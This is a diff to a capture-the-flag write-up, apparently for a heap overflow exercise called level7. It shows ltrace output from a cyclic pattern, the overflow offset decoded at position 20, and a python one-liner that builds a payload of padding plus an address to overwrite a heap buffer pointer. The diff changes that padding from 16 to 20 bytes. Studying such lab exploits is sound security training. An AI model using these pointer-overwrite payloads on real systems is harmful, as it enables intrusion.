@@ -96,19 +96,15 @@ ltrace ./level7 Aa0Aa1Aa2... aaaa
 strcpy(0x37614136, "aaaa")   ← chunk3->buf = 0x37614136
 ```
 
-Pattern `0x37614136` decodes to `6Aa7` at position **20** — but since we control the exact address, we use **16 bytes** padding directly :
+Pattern `0x37614136` decodes to `6Aa7` at position **20**
 
-```
-16 bytes fills chunk2 (8) + chunk3 header (8)
-then overwrites chunk3->buf pointer
-```
 
 ---
 
 ## Step 1 : Build payload for argv[1]
 
 ```bash
-python -c "print('A'*16 + '\x28\x99\x04\x08')" > /tmp/exploit
+python -c "print('A'*20 + '\x28\x99\x04\x08')" > /tmp/exploit
 ```
 
 ```
